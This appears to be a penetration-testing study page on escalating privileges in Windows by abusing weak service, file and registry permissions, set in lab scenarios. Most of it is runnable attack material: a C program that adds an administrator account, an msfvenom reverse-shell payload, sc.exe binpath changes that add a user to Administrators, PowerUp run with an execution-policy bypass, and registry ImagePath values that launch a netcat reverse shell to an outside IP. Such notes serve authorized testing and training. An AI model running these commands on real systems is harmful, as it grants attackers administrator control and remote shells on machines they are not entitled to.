---
title: Windows- Abusing weak permissions
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - windows
  - privilege
---
# Windows: Abusing weak permissions

## Permissive File System ACLs

### Previous Listing of  running processes

Display Running Processes:

```
# With Netstat
netstat -ano

###### Running processes
# List running processes:
Get-Process


###### Installed services
# Several method for retrieving services:
# 1. GUI snap-in services.msc
# 2. Get-Service cmd-let
# 3. Get-Ciminstance cmd-let (super seeding Get-WmiObject)
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

```


### Checking Permissions with SharpUp

We can use [SharpUp](sharpup.md) from the GhostPack suite of tools to check for service binaries suffering from weak ACLs.

```powershell
.\SharpUp.exe audit
```


### Checking Permissions with icacls

Syntax:

```powershell
Get-Acl -Path "C:\Path\To\File" 
icacls "C:\Path\To\File"
```

The permissions

| Mask | Permissions             |
| ---- | ----------------------- |
| F    | Full access             |
| M    | Modify access           |
| RX   | Read and execute access |
| R    | Read-only access        |
| W    | Write-only access       |
When reading the output for the icacls command, the indicator `(I)` preceding the permission means Inherited.

### Checking Permissions with AccessChk

Next, we'll use [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) from the Sysinternals suite to enumerate permissions on the service. The flags we use, in order, are `-q` (omit banner), `-u` (suppress errors), `-v` (verbose), `-c` (specify name of a Windows service), and `-w` (show only objects that have write access). 

```powershell
accesschk.exe /accepteula -quvcw WindscribeService
```

Output:

```
WindscribeService
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS
```

Here we can see that all Authenticated Users have [SERVICE_ALL_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) rights over the service, which means full read/write control over it.

## Service Binary Hijacking

If we identify a service running elevated that we have write permissions on, we may replace and force the service to restart.

### Alternative #1: Replace the binary manually 

#### Step 1: Create the malicious binary 

##### Cross-compiling our own binary

For instance. Let's create in kali the following binary adduser.c for creating an user and adding them to the Local Administrators group:

```c#
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```

Now, compile:

```
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

##### With msfvenom

Another way is using msfvenom.

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.181 LPORT=8443 -f exe > SecurityService.exe
```


#### Step 2 Make a backup of the original binary

We can make a backup of the original binary: 

```cmd-session
cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

#### Step 3: Replace the original file with you malicious one

Remember the nature of your malicious file. The msfvenom initiates an outbound connection, so get ready and set up a listener.  The adduser.exe binary will add another user.

#### Step 4: Reinitiate the service

Here it's important to run several checks:

Can your user restart the service? If the user can, perfect:

```powershell
net stop mysql
net start mysql
```

Also, another command for restarting a service:

```powershell
sc.exe stop WindscribeService
sc.exe start WindscribeService
```

Otherwise, if we cannot stop or start a service, we must consider another approach. If the service _Startup Type_ is set to "Automatic", we may be able to restart the service by rebooting the machine.  Let's check the Startup Type of the service:

```powershell
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
```

Desired output:

```text
Name  StartMode
----  ---------
mysql Auto
```

Now, check our own permissions:

```powershell
whoami /priv
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeSecurityPrivilege           Manage auditing and security log     Disabled
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
Otherwise, let
```

As we have `SeShutdownPrivilege` restart:

```powershell
shutdown /r /t 0
```

Flag `/r` for restarting. Flag `/t`  for waiting 0 seconds.


### Alternative #2: Replace the binary  with PowerUp.ps1 

Get the script from: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc

Directly:

```
https://github.com/PowerShellMafia/PowerSploit/raw/refs/heads/master/Privesc/PowerUp.ps1
```

Upload it to the target machine. We will use the module **`Get-ModifiableServiceFile`** to retrieve services vulnerables 

```powershell
iwr -uri http://192.168.48.3/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
 . .\PowerUp.ps1
Get-ModifiableServiceFile
```

And here comes the interesting part. **`PowerUp.ps1`** has a built-in function named `AbuseFunction` that takes care automatically of abusing these vulnerable services. The default behavior is to create a new local user called john with the password Password123! and add it to the local Administrators group.  However this is not always working. So the recommendation when so, goes to manual exploitation. 



### Alternative #3: Changing the Service Binary Path
Checking the local administrators group confirms that our user htb-student is not a member.

```powershell
net localgroup administrators
```

Let's change it to add our user to the local administrator group. We could set the binary path to run any command or executable of our choosing (such as a reverse shell binary).

```powershell
sc.exe config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
```

Now we need to restart the service, so the new binpath command will run the next time it is started.

```powershell
sc.exe stop WindscribeService
sc.exe start WindscribeService
```
 
Now we can confirm that our user htb-student is  a member of the Administrator group:

```powershell
net localgroup administrators
```


**Always Clean-up: Reverting the Binary Path**

```powershell
sc.exe config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"
```

Starting the Service Again: 

```powershell
sc.exe start WindScribeService
```

Verifying Service is Running: 

```powershell
sc.exe query WindScribeService
```


## Unquoted Service Path

When a service is installed, the registry configuration specifies a path to the binary that should be executed on service start. If this binary is not encapsulated within quotes, Windows will attempt to locate the binary in different folders. 

Querying the service `SystemExplorerHelpService`:

```powershell
sc.exe qc SystemExplorerHelpService
```

Output:

```
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: SystemExplorerHelpService
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Explorer Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

If we note the Binary Path: 

```
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```

Windows will decide the execution method of a program based on its file extension, so it's not necessary to specify it. Windows will attempt to load the following potential executables in order on service start, with a .exe being implied:

- `C:\Program`
- `C:\Program Files`
- `C:\Program Files (x86)\System`
- `C:\Program Files (x86)\System Explorer\service\SystemExplorerService64`

 Although it's not uncommon to find applications with unquoted service paths, it isn't often exploitable because we need permissions to write to those folders, or permissions to restart the service. 

### Searching for Unquoted Service Paths

In a cmd session:

```cmd-session
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

If we find any, we could include a malicious file created with msfvenom that is named after the binary.

### Check access to the paths

Next step is checks access rights in these paths with icacls. If we find a path where we have write access, we may place there our malicious binary. It's not necessary to give it the same name as the program.


### Abusing Unquoted Service Paths with PowerUp.ps1

```
iwr http://$kaliIP/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Get-UnquotedService
```

Output:

```
ServiceName    : GammaService
Path           : C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users;
                 Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'GammaService' -Path <HijackPath>
CanRestart     : True
Name           : GammaService
```

Attacking the vulnerable service, by default it will create a user named john that will be added to the Local Administrators group:

```powershell
Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
Restart-Service GammaService
net user
net localgroup administrators
```

## Permissive Registry ACLs

It is also worth searching for weak service ACLs in the Windows Registry. We can do this using `accesschk`.  Checking for Weak Service ACLs in Registry:

```cmd-session
accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
```

|Part|Meaning|
|---|---|
|`accesschk.exe`|[Sysinternals tool](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) to view security permissions (on files, registry keys, services, etc.)|
|`/accepteula`|Silently accepts the license agreement (avoids GUI popup)|
|`"mrb3n"`|The user account whose permissions you want to check|
|`-k`|Tells AccessChk to target **registry keys**|
|`-v`|Show **verbose** output (includes more details)|
|`-u`|Show permissions that apply to the **specified user** (i.e., `mrb3n`)|
|`-q`|Quiet — suppresses errors like “access denied”|
|`-s`|**Recurse** subkeys (goes deep into nested keys)|
|`-w`|Show only **keys that are writable** by the user|
|`hklm\System\CurrentControlSet\services`|The registry path being checked — where Windows service configurations live|

Basically, this command will recursively scan all subkeys under `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services`.  For each key, it checks if the user `mrb3n` has write permissions.

If `mrb3n` has write access to a service registry key, you can often:

- Hijack the service (change `ImagePath`, `binPath`, etc.)
- Get privilege escalation, especially if the service runs as SYSTEM
- Combine with service restart or reboot to trigger code execution

Above, find the change the binary path. Also let's understand the difference:

**binPath vs. ImagePath**

| Term                    | Where it's used                                                               | Meaning                                                      |
| ----------------------- | ----------------------------------------------------------------------------- | ------------------------------------------------------------ |
| `ImagePath`             | **Registry** value under `HKLM\SYSTEM\CurrentControlSet\Services\YourService` | Path to the executable that gets run when the service starts |
| `binPath` or `binPath=` | **Used in command-line tools** like `sc.exe`                                  | Argument that sets or shows the `ImagePath` for a service    |


- `ImagePath` is the actual registry value name    
- `binPath=` is just **how it's referred to in commands**


### Changing ImagePath with PowerShell

The `ImagePath` is a registry value under each service’s key that tells Windows what binary or command to execute when starting the service.

We can abuse this using the PowerShell cmdlet `Set-ItemProperty` to change the `ImagePath` value, using a command such as:

```powershell
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Tools\nc64.exe -e cmd.exe 10.10.14.158 8443"

Set-ItemProperty -Path HKLM:\System\CurrentControlSet\services\TrkWks -Name "ImagePath" -Value "C:\Tools\nc64.exe -e cmd.exe 10.10.14.158 8443"

```


## Modifiable Registry Autorun Binary

### Check Startup Programs

We can use WMIC to see what programs run at system startup.

```powershell
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
```

 Suppose we have write permissions to the registry for a given binary or can overwrite a binary listed. In that case, we may be able to escalate privileges to another user the next time that the user logs in.

This [post](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html) and [this site](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2) detail many potential autorun locations on Windows systems.

## Windows Update Orchestrator Service (UsoSVC)

Another notable example is the Windows [Update Orchestrator Service (UsoSvc)](https://docs.microsoft.com/en-us/windows/deployment/update/how-windows-update-works), which is responsible for downloading and installing operating system updates. It is considered an essential Windows service and cannot be removed. Since it is responsible for making changes to the operating system through the installation of security and feature updates, it runs as the all-powerful `NT AUTHORITY\SYSTEM` account.

Before installing the security patch relating to [CVE-2019-1322](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1322), it was possible to elevate privileges from a service account to `SYSTEM`. This was due to weak permissions, which allowed service accounts to modify the service binary path and start/stop the service.


